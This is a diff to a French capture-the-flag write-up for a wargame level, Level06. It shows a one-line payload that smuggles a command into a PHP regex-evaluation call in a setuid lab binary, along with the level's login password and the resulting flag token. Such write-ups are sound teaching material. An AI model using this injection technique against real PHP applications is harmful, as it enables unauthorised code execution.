@@ -1,4 +1,4 @@
-# Level06
+# Level06: Exploit execution
 
 > login:password -> *`level06:viuaaale9huek52boumoomioc`*
 ```
@@ -53,10 +53,12 @@ PHP Warning:  file_get_contents(test): failed to open stream: No such file or di
 On remarque que le binaire veux exécuter le fichier envoyé en paramètre. On va donc créer un script qu'il pourra alors éxécuter
 
 ```
-:~$ echo '[x ${`getflag`}]' > /tmp/flag
+:~$ echo '[x ${`getflag`}]' > /tmp/flag06
 
-:~$ ./level06 /tmp/flag
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+:~$ ./level06 /tmp/flag06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
 ```
 
 Le flag nous permet de se connecter au level07
